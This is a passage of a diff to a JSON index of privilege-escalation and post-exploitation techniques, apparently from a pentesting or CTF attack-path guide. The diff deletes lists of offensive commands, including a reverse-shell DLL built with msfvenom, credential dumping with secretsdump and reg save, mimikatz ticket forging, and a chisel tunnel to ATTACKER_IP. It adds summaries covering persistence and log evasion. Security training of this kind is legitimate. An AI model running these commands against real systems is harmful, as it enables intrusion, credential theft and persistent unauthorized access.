       "root-linux"
     ],
-    "summary": "",
+    "summary": "Exploit unpatched kernel vulnerabilities for direct root — PwnKit (CVE-2021-4034) is the most reliable and works on nearly every Linux system built before January 2022.",
     "references": [],
     "filePath": "nodes/05-privesc/linux-kernel.md"
   },
@@ -1137,15 +886,10 @@
     "tags": [
       "linux"
     ],
-    "tools": [
-      "echo -e \"XDG_SEAT=seat0\\nXDG_VTNR=1\" > ~/.pam_environment",
-      "pkcheck --action-id org.freedesktop.udisks2.loop-setup --process $$",
-      "udisksctl loop-setup -f payload.img"
-    ],
     "leads_to": [
       "root-linux"
     ],
-    "summary": "",
+    "summary": "Chain CVE-2025-6018 (fake console session via PAM) with CVE-2025-6019 (udisks XFS resize race) to plant an SUID root binary — specific to openSUSE/SLE15.",
     "references": [],
     "filePath": "nodes/05-privesc/linux-pam-polkit.md"
   },
@@ -1156,14 +900,10 @@
     "tags": [
       "linux"
     ],
-    "tools": [
-      "echo $PATH",
-      "strings /usr/bin/suid_binary | grep -v '^/'"
-    ],
     "leads_to": [
       "root-linux"
     ],
-    "summary": "",
+    "summary": "Plant a malicious binary earlier in PATH than the real one — exploitable when a SUID binary or root cron job calls a program by bare name without a full path.",
     "references": [],
     "filePath": "nodes/05-privesc/linux-path-hijack.md"
   },
@@ -1174,15 +914,10 @@
     "tags": [
       "linux"
     ],
-    "tools": [
-      "readelf -d /path/to/binary | grep rpath",
-      "ldd /path/to/binary",
-      "find / -writable -name \"*.so*\" 2>/dev/null"
-    ],
     "leads_to": [
       "root-linux"
     ],
-    "summary": "Hijack shared library loading via LD_PRELOAD, writable RPATH, or ldconfig paths to execute code as a privileged user.",
+    "summary": "Hijack shared library loading via LD_PRELOAD, writable RPATH, or ldconfig paths — a SUID binary or sudo command loading your library runs your code as root.",
     "references": [],
     "filePath": "nodes/05-privesc/linux-shared-lib.md"
   },
@@ -1193,14 +928,10 @@
     "tags": [
       "linux"
     ],
-    "tools": [
-      "sudo -l",
-      "sudo -u#-1 /bin/bash"
-    ],
     "leads_to": [
       "root-linux"
     ],
-    "summary": "",
+    "summary": "Check what you can run with sudo and abuse it for a root shell — GTFOBins covers 90% of cases, and misconfigurations like LD_PRELOAD or sudo < 1.8.28 cover the rest.",
     "references": [],
     "filePath": "nodes/05-privesc/linux-sudo.md"
   },
@@ -1211,14 +942,10 @@
     "tags": [
       "linux"
     ],
-    "tools": [
-      "find / -perm -4000 -type f 2>/dev/null",
-      "getcap -r / 2>/dev/null"
-    ],
     "leads_to": [
       "root-linux"
     ],
-    "summary": "",
+    "summary": "Find binaries with the SUID bit or elevated capabilities — both allow code execution at a higher privilege level without sudo, and GTFOBins covers most cases.",
     "references": [],
     "filePath": "nodes/05-privesc/linux-suid-caps.md"
   },
@@ -1229,17 +956,12 @@
     "tags": [
       "windows"
     ],
-    "tools": [
-      "whoami /priv",
-      "GodPotato-NET4.exe -cmd \"cmd /c whoami",
-      "PrintSpoofer64.exe -i -c cmd"
-    ],
     "leads_to": [
       "system-shell",
       "windows-stored-creds",
       "dcsync"
     ],
-    "summary": "",
+    "summary": "Abuse SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege to impersonate SYSTEM — present on virtually every service account, IIS app pool, and SQL Server account.",
     "references": [],
     "filePath": "nodes/05-privesc/token-impersonation.md"
   },
@@ -1250,16 +972,11 @@
     "tags": [
       "windows"
     ],
-    "tools": [
-      "procmon.exe (filter: PATH NOT FOUND + .dll)",
-      "msfvenom -p windows/x64/shell_reverse_tcp -f dll -o evil.dll",
-      "icacls \"C:\\path\\to\\dir"
-    ],
     "leads_to": [
       "system-shell",
       "rev-shell"
     ],
-    "summary": "Place a malicious DLL in a directory searched before the legitimate one to execute code in the context of a privileged process.",
+    "summary": "Plant a malicious DLL in a directory searched before the legitimate one — exploitable when a privileged process loads a DLL from a user-writable path or when a DLL is missing entirely.",
     "references": [],
     "filePath": "nodes/05-privesc/windows-dll-hijack.md"
   },
@@ -1271,17 +988,12 @@
       "windows",
       "ad"
     ],
-    "tools": [
-      "Get-GPPPassword (PowerSploit)",
-      "impacket-Get-GPPPassword domain/user:pass@$DC",
-      "findstr /S /I cpassword \\\\$DC\\SYSVOL\\*.xml"
-    ],
     "leads_to": [
       "password-spray",
       "system-shell",
       "domain-admin"
     ],
-    "summary": "Retrieve and decrypt AES-encrypted passwords stored in Group Policy Preference XML files on SYSVOL — key is publicly known.",
+    "summary": "Decrypt AES-encrypted passwords from Group Policy Preference XML files on SYSVOL — the key is public knowledge, and old entries persist indefinitely despite the 2014 patch.",
     "references": [],
     "filePath": "nodes/05-privesc/windows-gpp-creds.md"
   },
@@ -1293,17 +1005,12 @@
       "windows",
       "ad"
     ],
-    "tools": [
-      "whoami /priv | findstr /i SeBackupPrivilege",
-      "reg save HKLM\\\\SAM C:\\\\Temp\\\\SAM",
-      "impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL"
-    ],
     "leads_to": [
       "pass-the-hash",
       "domain-admin",
       "dcsync"
     ],
-    "summary": "",
+    "summary": "Use SeBackupPrivilege to bypass ACLs and read any file — dump SAM/SYSTEM for local hashes, or dump NTDS.dit from a DC for every domain account hash.",
     "references": [],
     "filePath": "nodes/05-privesc/windows-sebackup.md"
   },
@@ -1314,16 +1021,11 @@
     "tags": [
       "windows"
     ],
-    "tools": [
-      "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}",
-      "Get-ModifiableServiceFile",
-      "wmic service get name,displayname,pathname,startmode"
-    ],
     "leads_to": [
       "system-shell",
       "token-impersonation"
     ],
-    "summary": "",
+    "summary": "Replace a writable service binary or exploit an unquoted service path to execute code as SYSTEM when the service starts — winPEAS catches all of these automatically.",
     "references": [],
     "filePath": "nodes/05-privesc/windows-service-misconfig.md"
   },
@@ -1334,17 +1036,12 @@
     "tags": [
       "windows"
     ],
-    "tools": [
-      "cmdkey /list",
-      "reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
-      "lazagne.exe all"
-    ],
     "leads_to": [
       "winrm",
       "pass-the-hash",
       "system-shell"
     ],
-    "summary": "",
+    "summary": "Extract plaintext credentials from cmdkey, the registry, PowerShell history, and credential managers — Winlogon autologon entries are almost always plaintext and reused.",
     "references": [],
     "filePath": "nodes/05-privesc/windows-stored-creds.md"
   },
@@ -1355,16 +1052,11 @@
     "tags": [
       "windows"
     ],
-    "tools": [
-      "fodhelper UAC bypass (registry hijack)",
-      "eventvwr UAC bypass (registry hijack)",
-      "UACME project"
-    ],
     "leads_to": [
       "system-shell",
       "token-impersonation"
     ],
-    "summary": "Bypass User Account Control to elevate from medium to high integrity without triggering a UAC prompt — requires local admin group membership.",
+    "summary": "Elevate from medium to high integrity without a UAC prompt by hijacking COM object registry keys — requires being in the local Administrators group already.",
     "references": [],
     "filePath": "nodes/05-privesc/windows-uac-bypass.md"
   },
@@ -1376,15 +1068,11 @@
       "windows",
       "ad"
     ],
-    "tools": [
-      "impacket-secretsdump $DOMAIN/Administrator:password@$DC_IP",
-      "evil-winrm -i $DC_IP -u Administrator -H $NTLM"
-    ],
     "leads_to": [
       "golden-ticket",
       "pivot"
     ],
-    "summary": "",
+    "summary": "You have Domain Admin — dump all hashes, screenshot proof, grab krbtgt for persistence, and enumerate additional forests before finishing.",
     "references": [],
     "filePath": "nodes/06-objective/domain-admin.md"
   },
@@ -1396,15 +1084,11 @@
       "windows",
       "ad"
     ],
-    "tools": [
-      "impacket-secretsdump -just-dc-user krbtgt $DOMAIN/user:password@$DC_IP",
-      "impacket-lookupsid $DOMAIN/user:password@$DC_IP 0"
-    ],
     "leads_to": [
       "domain-admin",
       "silver-ticket"
     ],
-    "summary": "",
+    "summary": "Forge a TGT using the krbtgt hash for indefinite domain access — survives Administrator password changes and lasts 10 years by default.",
     "references": [],
     "filePath": "nodes/06-objective/golden-ticket.md"
   },
@@ -1416,18 +1100,12 @@
       "windows",
       "linux"
     ],
-    "tools": [
-      "./chisel server --port 9090 --reverse",
-      "./chisel client ATTACKER_IP:9090 R:socks",
-      "./proxy -selfcert -laddr 0.0.0.0:11601",
-      "ssh -D 1080 -N user@PIVOT_HOST"
-    ],
     "leads_to": [
       "nmap-scan",
       "smb-enum",
       "ldap-enum"
     ],
-    "summary": "",
+    "summary": "Route traffic through a compromised host to reach additional network segments — Ligolo-ng eliminates proxychains overhead, Chisel works through strict firewalls.",
     "references": [],
     "filePath": "nodes/06-objective/pivot.md"
   },
@@ -1438,15 +1116,10 @@
     "tags": [
       "linux"
     ],
-    "tools": [
-      "cat /root/root.txt",
-      "cat /root/proof.txt",
-      "cat /etc/shadow"
-    ],
     "leads_to": [
       "pivot"
     ],
-    "summary": "",
+    "summary": "You have root — grab the proof file, dump /etc/shadow for password reuse, plant SSH key persistence, and check for additional network segments to pivot into.",
     "references": [],
     "filePath": "nodes/06-objective/root-linux.md"
   },
@@ -1459,15 +1132,11 @@
       "ad",
       "kerberos"
     ],
-    "tools": [
-      "impacket-ticketer -spn cifs/$TARGET -domain-sid $SID -nthash $SERVICE_HASH -domain domain.local Administrator",
-      "mimikatz \"kerberos::golden /domain: /sid: /target: /service:cifs /rc4: /user:Administrator /ptt"
-    ],
     "leads_to": [
       "system-shell",
       "pivot"
     ],
-    "summary": "Forge a service ticket (TGS) using a service account's NTLM hash to access a specific service as any user — no DC contact required.",
+    "summary": "Forge a TGS for a specific service using the service account's NTLM hash — bypasses the KDC entirely and leaves no DC-side logs.",
     "references": [],
     "filePath": "nodes/06-objective/silver-ticket.md"
   },
@@ -1478,16 +1147,12 @@
     "tags": [
       "windows"
     ],
-    "tools": [
-      "type C:\\Users\\Administrator\\Desktop\\root.txt",
-      "impacket-secretsdump $DOMAIN/user:password@$TARGET"
-    ],
     "leads_to": [
       "pass-the-hash",
       "domain-admin",
       "pivot"
     ],
-    "summary": "",
+    "summary": "You have SYSTEM — grab proof, dump LSASS and SAM for credentials, spray hashes laterally, and check for additional subnets before finishing.",
     "references": [],
     "filePath": "nodes/06-objective/system-shell.md"
   }
